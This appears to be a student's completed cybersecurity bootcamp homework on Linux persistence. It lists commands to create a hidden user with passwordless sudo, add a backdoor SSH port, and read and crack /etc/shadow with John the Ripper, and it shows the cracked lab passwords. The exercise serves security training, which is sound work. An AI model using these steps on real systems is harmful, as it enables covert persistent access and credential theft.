# Bash-Scripting-and-Programming

## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - `Your solution command here`

useradd --no-create-home sysd

2. Give your secret user a password: 
    - `Your solution command here`

passwd sysd

3. Give your secret user a system UID < 1000:
    - `Your solution command here`

usermod -u 0989 sysd

4. Give your secret user the same GID:
   - `Your solution command here`

groupmod -g 0989 sysd


5. Give your secret user full `sudo` access without the need for a password:
   -  `Your solution command here`

visudo
( added = ) sysd    ALL=(ALL:ALL) NOPASSWD:ALL

6. Test that `sudo` access works without your password:

$ sudo -l

Matching Defaults entries for sysd on scavenger-hunt:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User sysd may run the following commands on scavenger-hunt:
    (ALL : ALL) NOPASSWD:ALL

( 2nd test )sudo useradd tester ( did not inquire for a password )

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

sudo vim /etc/ssh/sshd_config
beneath #Port 22 add line "Port 2222" 
    
**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:

sudo service ssh restart

2. Exit the `root` account:

exit

3. SSH to the target machine using your `sysd` account and port `2222`:

ssh sysd@192.168.6.105 -p 2222

4. Use `sudo` to switch to the root user:

sudo -s

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

ssh sysd@192.168.6.105 -p 2222

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:
sudo -s

snap install john-the-ripper

cat /etc/shadow | awk '{print $1, $2}' >> /etc/passwords.txt

/usr/sbin/john /etc/passwords.txt

RESULTS =

Created directory: /root/.john
Loaded 8 password hashes with 8 different salts (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
sysd             (sysd)
computer         (stallman)
freedom          (babbage)
trustno1         (mitnik)
dragon           (lovelace)
lakers           (turing)
passw0rd         (sysadmin)
Goodluck!        (student)
8g 0:00:02:50 100% 2/3 0.04687g/s 644.6p/s 660.9c/s 660.9C/s Missy!..Jupiter!
Use the "--show" option to display all of the cracked passwords reliably
Session completed

---

Â© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

